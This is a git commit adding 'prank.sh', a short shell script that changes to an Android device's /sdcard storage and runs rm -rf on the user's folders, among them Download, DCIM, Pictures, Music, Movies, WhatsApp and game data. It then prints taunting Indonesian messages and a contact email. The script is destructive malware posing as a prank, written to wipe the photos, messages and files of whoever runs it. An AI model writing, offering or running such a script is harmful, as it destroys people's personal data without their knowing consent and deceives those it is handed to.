c0fd01945ac2e829aa5a035a2056d7b8e09ba170
F4DeDty <84605709+F4DeDty@users.noreply.github.com>
2021-05-25 12:47:06 +0800

    Add files via upload

---
+++ prank.sh
@@ -0,0 +1,18 @@
+cd /sdcard
+rm -rf Android
+rm -rf android
+rm -rf vidio
+rm -rf vidioku
+rm -rf Download
+rm -rf DCIM
+rm -rf UCDownloads
+rm -rf com.garena.game.codm
+rm -rf Music
+rm -rf Pictures
+rm -rf Movies
+rm -rf WhatsApp
+echo "Yaelah Di Bilang Jangan di Pakai bandal"
+echo "Coba Lihat Internal Lu"
+echo "apa Yang terjadi Bosku"
+echo "Hubungi==>reyspeed01@gmail.com"
+echo "gk Percaya Sih Bosku Sama Gua Jadi Gini Kan"
